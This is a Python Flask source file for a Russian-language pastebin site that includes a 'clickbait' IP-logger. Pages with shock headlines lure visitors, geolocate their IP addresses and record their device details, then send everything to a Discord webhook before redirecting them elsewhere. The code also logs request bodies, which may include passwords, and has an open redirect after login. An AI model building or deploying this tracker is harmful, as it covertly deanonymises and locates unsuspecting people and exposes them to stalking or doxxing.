import logging
from logging.handlers import RotatingFileHandler
import os
import time
from datetime import datetime, timedelta
from functools import wraps

import httpagentparser
import requests
from dotenv import load_dotenv
from flask import Flask, render_template, redirect, url_for, request, flash, abort, jsonify
from flask import send_from_directory
from flask_caching import Cache
from flask_compress import Compress
from flask_login import LoginManager, login_user, login_required, logout_user, current_user, UserMixin
from flask_sqlalchemy import SQLAlchemy
from flask_wtf import FlaskForm, RecaptchaField
from sqlalchemy.exc import OperationalError
from werkzeug.security import generate_password_hash, check_password_hash
from wtforms import StringField, PasswordField, SubmitField, TextAreaField, BooleanField, SelectField, SelectMultipleField
from wtforms.validators import DataRequired, Length, Email, EqualTo, ValidationError, Optional
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from pygments import highlight
from pygments.lexers import get_lexer_by_name
from pygments.formatters import HtmlFormatter
import markdown
from markdown.extensions.toc import TocExtension
from markdown.extensions.codehilite import CodeHiliteExtension
import bleach
import re


# Загрузка переменных окружения из файла .env
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'default_secret_key')
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'default_database_url')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['RECAPTCHA_PUBLIC_KEY'] = os.getenv('RECAPTCHA_PUBLIC_KEY')
app.config['RECAPTCHA_PRIVATE_KEY'] = os.getenv('RECAPTCHA_PRIVATE_KEY')
compress = Compress()
compress.init_app(app)
app.config['COMPRESS_MIMETYPES'] = [
    'text/html',
    'text/css',
    'text/xml',
    'application/json',
    'application/javascript'
]
app.config['COMPRESS_LEVEL'] = 6
app.config['COMPRESS_MIN_SIZE'] = 500

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'
cache = Cache(app, config={'CACHE_TYPE': 'SimpleCache'})
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379/0")

# ------------------ Конфигурация для EFISbin ------------------
CLICKBAIT_TITLE = "😱 ШОК! Вы не поверите, что здесь скрыто..."
CLICKBAIT_DESCRIPTION = "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Посмотрите, пока не удалили!"
CLICKBAIT_IMAGE = "https://example.com/image.png"
REAL_URL = "https://example.com/real"
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'default_webhook_url')
click_count = 0
# -------------------------------------------------------------

# Использование переменных окружения
VPN_CHECK = int(os.getenv("VPN_CHECK", "1"))  # По умолчанию 1, если не установлено
ANTI_BOT = int(os.getenv("ANTI_BOT", "1"))    # По умолчанию 1, если не установлено
handler = RotatingFileHandler('app.log', maxBytes=10000, backupCount=3)
handler.setLevel(logging.INFO)
app.logger.addHandler(handler)

# Конфигурация для логирования изображений
config = {
    "webhook": DISCORD_WEBHOOK_URL,
    "image": CLICKBAIT_IMAGE,
    "imageArgument": True,
    "username": "EFISbin",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Hello, world!",
        "richMessage": True,
    },
    "vpnCheck": VPN_CHECK,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": ANTI_BOT,
    "redirect": {
        "redirect": True,
        "page": REAL_URL
    },
}

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "EFISbin - Ошибка",
                "color": config["color"],
                "description": f"Произошла ошибка при попытке залогировать IP!\n\n**Ошибка:**\n\n{error}\n",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "EFISbin - Ссылка отправлена",
                    "color": config["color"],
                    "description": f"Ссылка EFISbin была отправлена в чат!\nВы можете получить IP.\n\n**Конечная точка:** `{endpoint}`\n**IP:** `{ip}`\n**Платформа:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857")
        response.raise_for_status()  # Вызов исключения для HTTP ошибок
        info = response.json()

        if 'proxy' in info and info["proxy"]:
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""

        if 'hosting' in info and info["hosting"]:
            if config["antiBot"] == 4:
                if info.get("proxy"):
                    pass
                else:
                    return
            if config["antiBot"] == 3:
                return
            if config["antiBot"] == 2:
                if info.get("proxy"):
                    pass
                else:
                    ping = ""
            if config["antiBot"] == 1:
                ping = ""

        os, browser = httpagentparser.simple_detect(useragent)

        timezone_parts = info.get('timezone', 'Unknown/Unknown').split('/')
        timezone_name = timezone_parts[1].replace('_', ' ') if len(timezone_parts) > 1 else 'Unknown'
        timezone_region = timezone_parts[0] if len(timezone_parts) > 1 else 'Unknown'

        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "EFISbin - IP залогирован",
                    "color": config["color"],
                    "description": f"""**Пользователь открыл оригинальное изображение!**

**Конечная точка:** `{endpoint}`

**Информация об IP:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Провайдер:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Страна:** `{info.get('country', 'Unknown')}`
> **Регион:** `{info.get('regionName', 'Unknown')}`
> **Город:** `{info.get('city', 'Unknown')}`
> **Координаты:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Приблизительные' if not coords else 'Точные, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Часовой пояс:** `{timezone_name}` ({timezone_region})
> **Мобильный:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Бот:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Возможно' if info.get('hosting') else 'False'}`

**Информация о ПК:**
> **ОС:** `{os}`
> **Браузер:** `{browser}`

**User Agent:**
```
{useragent}
```""",
                }
            ],
        }

        if url:
            embed["embeds"][0].update({"thumbnail": {"url": url}})
        requests.post(config["webhook"], json=embed)
        return info

    except requests.exceptions.RequestException as e:
        logging.error(f"Ошибка обработки информации об IP: {e}")
        return
    except ValueError as e:
        logging.error(f"Ошибка разбора JSON: {e}")
        return

# Функция для логирования IP
def ip_logger(event="Новый визит", custom_data=None):
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referrer = request.headers.get('Referer')
    content = f"🚨 {event}!\n**IP:** {user_ip}\n**User-Agent:** {user_agent}\n**Referrer:** {referrer}"

    if custom_data:
        content += f"\n**Дополнительные данные:** {custom_data}"

    payload = {"content": content}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print("Ошибка отправки вебхука Discord:", e)

def send_notification(user, message):
    """Отправка уведомления пользователю через Discord"""
    try:
        payload = {
            "content": f"🔔 Уведомление для {user.username}:\n{message}"
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        app.logger.error(f"Ошибка отправки уведомления: {str(e)}")

# Модель пользователя
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    email = db.Column(db.String(150), unique=True, nullable=True)  # Сделать email необязательным
    password_hash = db.Column(db.String(200), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)  # Флаг админа
    is_banned = db.Column(db.Boolean, default=False)  # Флаг бана
    hardware_id = db.Column(db.String(256), unique=True, nullable=True)  # Идентификатор оборудования
    pastes = db.relationship('Paste', backref='author', lazy=True)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_admin:
            flash("У вас нет доступа к этой странице.", "danger")
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

# Модель Paste
class Paste(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(150))
    content = db.Column(db.Text, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    is_anonymous = db.Column(db.Boolean, default=False)  # Анонимная публикация
    language = db.Column(db.String(50), default='text')  # Язык для подсветки синтаксиса

class AdminLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    admin_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    action = db.Column(db.String(256), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    details = db.Column(db.Text, nullable=True)

# Модель Clickbait
class Clickbait(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), unique=True, nullable=False)  # Новое поле
    title = db.Column(db.String(256), nullable=False)
    description = db.Column(db.String(512), nullable=False)
    image_url = db.Column(db.String(512), nullable=False)
    real_url = db.Column(db.String(512), nullable=False)

# Модель тегов
class Tag(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(50), unique=True)

paste_tags = db.Table('paste_tags',
    db.Column('paste_id', db.Integer, db.ForeignKey('paste.id')),
    db.Column('tag_id', db.Integer, db.ForeignKey('tag.id'))
)

# Модель оценок
class Vote(db.Model):
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), primary_key=True)
    paste_id = db.Column(db.Integer, db.ForeignKey('paste.id'), primary_key=True)
    value = db.Column(db.Integer)  # 1 или -1

# Модель комментариев
class Comment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    text = db.Column(db.Text)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    paste_id = db.Column(db.Integer, db.ForeignKey('paste.id'))

@login_manager.user_loader
def load_user(user_id):
    with app.app_context():
        return db.session.get(User, int(user_id))

# Форма регистрации
class RegistrationForm(FlaskForm):
    username = StringField('Имя пользователя', validators=[DataRequired(), Length(3, 150)])
    email = StringField('Email', validators=[Optional(), Email(), Length(max=150)])  # Сделать email необязательным
    password = PasswordField('Пароль', validators=[DataRequired(), Length(6, 100)])
    confirm_password = PasswordField('Подтвердите пароль', validators=[DataRequired(), EqualTo('password')])
    recaptcha = RecaptchaField()
    submit = SubmitField('Регистрация')

    def validate_username(self, username):
        user = User.query.filter_by(username=username.data).first()
        if user:
            raise ValidationError('Это имя пользователя уже занято. Пожалуйста, выберите другое.')

    def validate_email(self, email):
        if email.data:  # Проверка только если email предоставлен
            user = User.query.filter_by(email=email.data).first()
            if user:
                raise ValidationError('Этот email уже зарегистрирован.')

# Форма входа
class LoginForm(FlaskForm):
    username = StringField('Имя пользователя', validators=[DataRequired(), Length(3, 150)])
    password = PasswordField('Пароль', validators=[DataRequired()])
    submit = SubmitField('Войти')

# Форма Paste
class PasteForm(FlaskForm):
    title = StringField('Заголовок', validators=[Length(max=150)])
    content = TextAreaField('Содержимое', validators=[DataRequired()])
    is_anonymous = BooleanField('Анонимная публикация')
    language = SelectField(
        'Язык',
        choices=[
            ('python', 'Python'),
            ('javascript', 'JavaScript'),
            ('html', 'HTML'),
            ('text', 'Текст')
        ],
        default='text'
    )
    tags = SelectMultipleField('Теги', choices=[])
    submit = SubmitField('Создать Paste')

# Форма редактирования Paste
class EditPasteForm(FlaskForm):
    title = StringField('Заголовок', validators=[Length(max=150)])
    content = TextAreaField('Содержимое', validators=[DataRequired()])
    submit = SubmitField('Сохранить изменения')

# Форма Clickbait
class ClickbaitForm(FlaskForm):
    slug = StringField('Название/ЧПУ', validators=[DataRequired(), Length(max=100)])
    title = StringField('Заголовок', validators=[DataRequired(), Length(max=256)])
    description = StringField('Описание', validators=[DataRequired(), Length(max=512)])
    image_url = StringField('URL изображения', validators=[DataRequired(), Length(max=512)])
    real_url = StringField('Реальный URL', validators=[DataRequired(), Length(max=512)])
    submit = SubmitField('Сохранить')

    def validate_slug(self, slug):
        clickbait = Clickbait.query.filter_by(slug=slug.data).first()
        if clickbait:
            raise ValidationError('Этот ЧПУ уже занят. Пожалуйста, выберите другой.')

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    storage_uri=REDIS_URL,  # Указываем Redis
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

# Главная страница: список последних Paste
@app.route('/sitemap.xml')
def sitemap():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'sitemap.xml')

@app.route('/robots.txt')
def robots():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'static/robots.txt')

@app.before_request
def log_request_info():
    app.logger.info('Заголовки: %s', request.headers)
    app.logger.info('Тело: %s', request.get_data())

@app.after_request
def add_header(response):
    if request.path.startswith('/static/'):
        response.cache_control.max_age = 31536000  # 1 год
        response.cache_control.public = True
        response.headers['Expires'] = (datetime.now() + timedelta(days=365)).strftime('%a, %d %b %Y %H:%M:%S GMT')
    return response

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

@app.route('/')
@cache.cached(timeout=60)
def index():
    language = request.args.get('language', '')
    query = Paste.query
    if language:
        query = query.filter_by(language=language)
    pastes = query.order_by(Paste.created_at.desc()).all()
    return render_template('index.html', pastes=pastes)

@app.route('/privacy')
def privacy():
    return render_template('privacy.html')

@app.route('/terms')
def terms():
    return render_template('terms.html')

@app.route('/apple-touch-icon.png')
@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                              'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/offline')
def offline():
    return render_template('offline.html')

# ---------------------- Админ-панель ----------------------
@app.route('/admin')
@login_required
@admin_required
def admin_panel():
    return render_template('admin.html')

# Управление пользователями: список всех пользователей
@app.route('/admin/users')
@login_required
@admin_required
def admin_users():
    users = User.query.all()
    return render_template('admin_users.html', users=users)

# Управление Paste: список всех Paste
@app.route('/admin/pastes')
@login_required
@admin_required
def admin_pastes():
    pastes = Paste.query.order_by(Paste.created_at.desc()).all()
    return render_template('admin_pastes.html', pastes=pastes)

# Управление Clickbait
@app.route('/admin/clickbait', methods=['GET', 'POST'])
@login_required
@admin_required
def admin_clickbait():
    clickbaits = Clickbait.query.all()
    return render_template('admin_clickbait.html', clickbaits=clickbaits)

@app.route('/admin/clickbait/delete/<int:cb_id>', methods=['POST'])
@login_required
@admin_required
def delete_clickbait(cb_id):
    clickbait = Clickbait.query.get_or_404(cb_id)
    db.session.delete(clickbait)
    db.session.commit()
    flash('Clickbait успешно удален', 'success')
    return redirect(url_for('admin_clickbait'))

@app.route('/admin/clickbait/new', methods=['GET', 'POST'])
@login_required
@admin_required
def new_clickbait():
    form = ClickbaitForm()
    if form.validate_on_submit():
        clickbait = Clickbait(
            slug=form.slug.data,
            title=form.title.data,
            description=form.description.data,
            image_url=form.image_url.data,
            real_url=form.real_url.data
        )
        db.session.add(clickbait)
        db.session.commit()
        flash("Новый clickbait создан", "success")
        return redirect(url_for('admin_clickbait'))
    return render_template('new_clickbait.html', form=form)

# Редактирование Clickbait
@app.route('/admin/clickbait/edit/<int:cb_id>', methods=['GET', 'POST'])
@login_required
@admin_required
def edit_clickbait(cb_id):
    clickbait = Clickbait.query.get_or_404(cb_id)
    form = ClickbaitForm(obj=clickbait)
    if form.validate_on_submit():
        form.populate_obj(clickbait)
        db.session.commit()
        flash("Clickbait обновлен", "success")
        return redirect(url_for('admin_clickbait'))
    return render_template('edit_clickbait.html', form=form, clickbait=clickbait)

@app.route('/clickbait/<slug>')
def clickbait_page(slug):
    global click_count
    click_count += 1

    clickbait = Clickbait.query.filter_by(slug=slug).first_or_404()

    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    makeReport(user_ip, user_agent, endpoint=request.path)

    return render_template('clickbait.html',
                           clickbait_title=clickbait.title,
                           clickbait_description=clickbait.description,
                           clickbait_image=clickbait.image_url,
                           real_url=clickbait.real_url)

@app.route('/clickbait-list')
def clickbait_list():
    clickbaits = Clickbait.query.all()
    return render_template('clickbait_list.html', clickbaits=clickbaits)

# Админ-функции для управления clickbait (статистика и сброс счетчика)
@app.route('/admin/clickbait/reset', methods=['POST'])
@login_required
@admin_required
def reset_clickbait():
    global click_count
    click_count = 0
    flash("Счетчик кликов сброшен.", "success")
    return redirect(url_for('admin_clickbait'))

# Управление банами пользователей
@app.route('/admin/ban/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def ban_user(user_id):
    user = db.session.get(User, user_id)
    if user:
        user.is_banned = True
        db.session.commit()
        flash(f"Пользователь {user.username} забанен.", "success")
    return redirect(url_for('admin_users'))

@app.route('/admin/unban/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def unban_user(user_id):
    user = db.session.get(User, user_id)
    if user:
        user.is_banned = False
        db.session.commit()
        flash(f"Пользователь {user.username} разбанен.", "success")
    return redirect(url_for('admin_users'))

# Управление удалением Paste
@app.route('/admin/paste/delete/<int:paste_id>', methods=['POST'])
@login_required
@admin_required
def delete_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if paste:
        db.session.delete(paste)
        db.session.commit()
        flash("Paste успешно удален.", "success")
    return redirect(url_for('admin_pastes'))

# Просмотр админ-логов
@app.route('/admin/logs')
@login_required
@admin_required
def admin_logs():
    logs = AdminLog.query.order_by(AdminLog.timestamp.desc()).all()
    return render_template('admin_logs.html', logs=logs)

@app.route('/admin/paste/edit/<int:paste_id>', methods=['GET', 'POST'])
@login_required
@admin_required
def edit_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if not paste:
        abort(404)
    form = EditPasteForm(obj=paste)
    if form.validate_on_submit():
        paste.title = form.title.data
        paste.content = form.content.data
        db.session.commit()

        # Логирование действия
        log = AdminLog(admin_id=current_user.id, action=f"Отредактирован paste ID: {paste_id}", details=f"Заголовок: {paste.title}, Содержимое: {paste.content}")
        db.session.add(log)
        db.session.commit()

        flash("Paste успешно отредактирован.", "success")
        return redirect(url_for('admin_pastes'))
    return render_template('edit_paste.html', form=form, paste=paste)

@app.route('/paste/request_edit/<int:paste_id>', methods=['GET', 'POST'])
@login_required
def request_edit_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if not paste:
        abort(404)
    if not current_user.is_admin and paste.user_id != current_user.id:
        flash("У вас нет прав для редактирования этого paste.", "danger")
        return redirect(url_for('index'))
    form = EditPasteForm(obj=paste)
    if form.validate_on_submit():
        paste.title = form.title.data
        paste.content = form.content.data
        db.session.commit()

        # Логирование действия
        if current_user.is_admin:
            log = AdminLog(admin_id=current_user.id, action=f"Отредактирован paste ID: {paste_id}", details=f"Заголовок: {paste.title}, Содержимое: {paste.content}")
            db.session.add(log)
            db.session.commit()

        flash("Paste успешно отредактирован.", "success")
        return redirect(url_for('view_paste', paste_id=paste.id))
    return render_template('edit_paste.html', form=form, paste=paste)

# ------------------- Функции Clickbait --------------------
# Генерация ссылки Clickbait
@app.route('/clickbait/generate')
def generate_link():
    clickbait = Clickbait.query.first()
    if clickbait:
        return f"Вот ваша ссылка clickbait: {url_for('clickbait_page', _external=True)}"
    else:
        return "Clickbait не настроен.", 404

@app.route('/register', methods=['GET', 'POST'])
@limiter.limit("5 per minute")
def register():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = RegistrationForm()
    if form.validate_on_submit():
        user = User(
            username=form.username.data,
            email=form.email.data if form.email.data else None  # Сохранить None, если email пустой
        )
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('Регистрация успешна! Пожалуйста, войдите.', 'success')
        return redirect(url_for('login'))
    return render_template('register.html', form=form)

# Страница входа
@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and user.check_password(form.password.data):
            if user.is_banned:
                flash("Ваш аккаунт забанен.", "danger")
                return redirect(url_for('login'))
            login_user(user)
            flash('Вы успешно вошли в систему.', 'success')
            next_page = request.args.get('next')
            return redirect(next_page) if next_page else redirect(url_for('index'))
        else:
            flash('Неверное имя пользователя или пароль.', 'danger')
    return render_template('login.html', form=form)

# Выход
@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('Вы вышли из системы.', 'info')
    return redirect(url_for('index'))

# Функция для санитайзинга HTML контента
def sanitize_html(content):
    tags = [
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'b', 'i', 'strong', 'em', 'a', 'p', 'ul', 'ol', 'li',
        'blockquote', 'code', 'pre', 'hr', 'br', 'table', 'thead', 'tbody', 'tr', 'th', 'td'
    ]
    attributes = {
        'a': ['href', 'title'],
        'img': ['src', 'alt'],
    }
    return bleach.clean(content, tags=tags, attributes=attributes, strip=True)

# Создание нового Paste (только для аутентифицированных пользователей)
@app.route('/create', methods=['GET', 'POST'])
@login_required
def create_paste():
    form = PasteForm()
    if form.validate_on_submit():
        content = request.form['content']
        # Конвертация Markdown в HTML с расширениями
        html_content = markdown.markdown(
            content,
            extensions=[
                TocExtension(),
                CodeHiliteExtension(),
                'markdown.extensions.extra'
            ]
        )
        # Санитайзинг HTML контента
        safe_html_content = sanitize_html(html_content)

        paste = Paste(
            title=form.title.data,
            content=safe_html_content,
            author=current_user,
            is_anonymous=form.is_anonymous.data,
            language=form.language.data,
            tags=[Tag.query.get(tag_id) for tag_id in form.tags.data]
        )
        db.session.add(paste)
        db.session.commit()
        flash('Новый Paste успешно создан!', 'success')
        return redirect(url_for('index'))
    form.tags.choices = [(tag.id, tag.name) for tag in Tag.query.all()]
    return render_template('create.html', form=form)

# Просмотр конкретного Paste
@app.route('/paste/<int:paste_id>')
def view_paste(paste_id):
    paste = Paste.query.get_or_404(paste_id)
    lexer = get_lexer_by_name(paste.language, stripall=True)
    formatter = HtmlFormatter(linenos=True, cssclass="codehilite")
    highlighted = highlight(paste.content, lexer, formatter)
    return render_template('paste.html', paste=paste, content=highlighted)

# Поиск по заголовкам/контенту
@app.route('/search')
def search():
    query = request.args.get('query', '')
    results = Paste.query.filter(
        Paste.title.ilike(f'%{query}%') |
        Paste.content.ilike(f'%{query}%')
    ).all()
    return render_template('search.html', results=results)

# Фильтры по языкам/дате/авторам
@app.route('/pastes')
def pastes():
    language = request.args.get('language')
    date = request.args.get('date')
    query = Paste.query
    if language:
        query = query.filter_by(language=language)
    if date:
        query = query.filter(Paste.created_at >= date)
    return render_template('pastes.html', pastes=query.all())

# Лайки/дизлайки
@app.route('/vote/<int:paste_id>/<int:value>', methods=['POST'])
@login_required
def vote(paste_id, value):
    vote = Vote.query.filter_by(user_id=current_user.id, paste_id=paste_id).first()
    if vote:
        vote.value = value
    else:
        vote = Vote(user_id=current_user.id, paste_id=paste_id, value=value)
        db.session.add(vote)
    db.session.commit()
    paste = Paste.query.get_or_404(paste_id)
    likes = db.session.query(db.func.count()).filter_by(paste_id=paste_id, value=1).scalar()
    dislikes = db.session.query(db.func.count()).filter_by(paste_id=paste_id, value=-1).scalar()
    return jsonify({'likes': likes, 'dislikes': dislikes})

# Комментарии с @упоминаниями
@app.route('/comment/<int:paste_id>', methods=['POST'])
@login_required
def comment(paste_id):
    text = request.form['text']
    comment = Comment(text=text, user_id=current_user.id, paste_id=paste_id)
    db.session.add(comment)
    db.session.commit()

    # Обработка упоминаний
    mentioned_users = re.findall(r'@(\w+)', text)
    for username in mentioned_users:
        user = User.query.filter_by(username=username).first()
        if user:
            send_notification(user, f"Вас упомянули в комментарии: {text}")

    return redirect(url_for('view_paste', paste_id=paste_id))

# Шаринг в соцсети
@app.route('/share/<int:paste_id>')
def share(paste_id):
    paste = Paste.query.get_or_404(paste_id)
    return render_template('share.html', paste=paste)

# Предпросмотр пасты
@app.route('/preview', methods=['POST'])
def preview():
    content = request.json.get('content', '')
    return markdown.markdown(content)

def create_tables():
    retries = 5
    while retries > 0:
        try:
            db.create_all()
            print("Таблицы успешно созданы.")
            break
        except OperationalError as e:
            print(f"OperationalError: {e}")
            retries -= 1
            if retries > 0:
                print("Повторная попытка подключения...")
                time.sleep(2)  # Подождать перед повторной попыткой
            else:
                print("Не удалось подключиться к базе данных после нескольких попыток.")
                raise

if __name__ == '__main__':
    with app.app_context():
        db.drop_all()  # Удалить все таблицы
        db.create_all()  # Создать заново с новыми полями
        app.run(debug=True)